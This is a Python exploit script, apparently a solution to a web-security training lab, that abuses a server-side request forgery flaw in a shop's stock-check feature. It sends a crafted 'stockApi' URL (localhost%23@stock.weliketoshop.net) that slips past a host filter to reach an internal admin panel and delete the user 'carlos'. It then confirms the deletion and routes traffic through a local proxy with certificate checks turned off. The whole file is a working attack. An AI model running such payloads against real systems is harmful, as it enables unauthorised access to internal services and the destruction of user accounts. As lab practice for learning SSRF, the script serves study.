import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def delete_user(url):
    # Delete the user 'carlos'
    delete_user_url_ssrf_payload = "http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos"
    check_stock_path = '/product/stock'
    params = {'stockApi': delete_user_url_ssrf_payload}
    res = requests.post(url+check_stock_path, data=params,
                        verify=False, proxies=proxies)

    # Check if user was deleted
    params2 = {'stockApi': 'http://localhost%23@stock.weliketoshop.net/admin'}

    res = requests.post(url+check_stock_path, data=params2,
                        verify=False, proxies=proxies)

    if 'carlos' not in res.text:
        print("[+] Sucessfully deleted user 'carlos'!")
    else:
        print("[-] Exploit was unsuccessful.")

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        print(f"[+] Example: {sys.argv[0]} http://example.com")
        sys.exit(-1)

    url = sys.argv[1]
    print("[+] Deleting user 'carlos'...")
    delete_user(url)
   
if __name__ == '__main__':
    main()
